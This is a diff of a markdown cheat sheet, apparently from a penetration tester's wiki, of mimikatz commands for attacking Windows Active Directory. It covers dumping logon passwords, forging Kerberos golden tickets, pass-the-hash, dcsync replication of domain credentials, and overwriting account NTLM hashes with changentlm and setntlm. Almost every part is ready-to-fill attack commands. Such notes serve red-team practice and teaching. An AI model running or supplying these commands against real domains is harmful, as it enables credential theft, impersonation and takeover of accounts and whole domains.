@@ -21,26 +21,43 @@ mimikatz "log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "e
 ```
 
 # Make a Golden ticket
-<details>
-  <summary>Find SID</summary>
-  
-  Using [wmic](https://github.com/okazymyrov/piki/blob/master/wmic.md#get-sids-of-domains) or 
-  ```console
-  whoami /all
-  ```
-  
-</details>
-
 ```console
 mimikatz "kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /aes256:<aes256_hmac> /id:<user_id> /groups:<group_id> /startoffset:0 /endin:600 /renewmax:10080 /ticket:<user.domain.kirbi>" "exit"
 ```
 
+SID can be found by [wmic](https://github.com/okazymyrov/piki/blob/master/wmic.md#get-sids-of-domains) or 
+```console
+whoami /all
+```
+
 # Path-the-hash
 ```console
-mimikatz "sekurlsa::pth /user:<user> /aes256:<aes256_hmac> /domain:<domain> /run:cmd.exe" "exit"
+
+mimikatz "privilege::debug" "sekurlsa::pth /user:<user> /aes256:<aes256_hmac> /domain:<domain> /run:cmd.exe" "exit"
 ```
 
 # dcsync
 ```console
 mimikatz  "log" "lsadump::dcsync /domain:<domain>.local /user:<domain>\<user>" "exit"
 ```
+
+# changentlm
+
+> **Note**
+> While lsadump::setntlm seems to work multiple times for the same user account, this is not the case for lsadump::changentlm ([link](https://github.com/gentilkiwi/mimikatz/issues/201#issuecomment-483788010)).
+ 
+## Password string 
+```console
+lsadump::changentlm /server:<dc>.<domain>.local /user:<user> /oldntlm:<ntlm> /newpassword:<password>
+```
+## NTLM
+```console
+lsadump::changentlm /server:<dc>.<domain>.local /user:<user> /oldntlm:<ntlm> /newntlm:<rc4>
+```
+
+# setntlm
+```console
+lsadump::setntlm /server:<dc>.<domain>.local /user:<user> /ntlm:<ntlm>
+```
+
+
